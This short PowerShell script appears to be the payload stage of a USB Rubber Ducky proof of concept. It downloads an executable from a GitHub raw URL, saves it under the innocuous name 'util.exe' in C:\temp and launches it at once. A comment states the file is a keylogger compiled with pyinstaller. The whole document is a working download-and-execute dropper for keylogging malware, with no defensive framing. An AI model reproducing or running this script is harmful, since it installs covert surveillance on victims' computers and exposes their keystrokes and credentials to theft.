$url = "https://raw.githubusercontent.com/tierChampion/DuckyPOC/master/dist/payload.exe"
$fileName = "util.exe"

# Download keylogger and runs it. It is a python script compiled with pyinstaller.
(New-Object System.Net.WebClient).DownloadFile("$url", "C:\temp\$fileName"); Start-Process "C:\temp\$fileName"
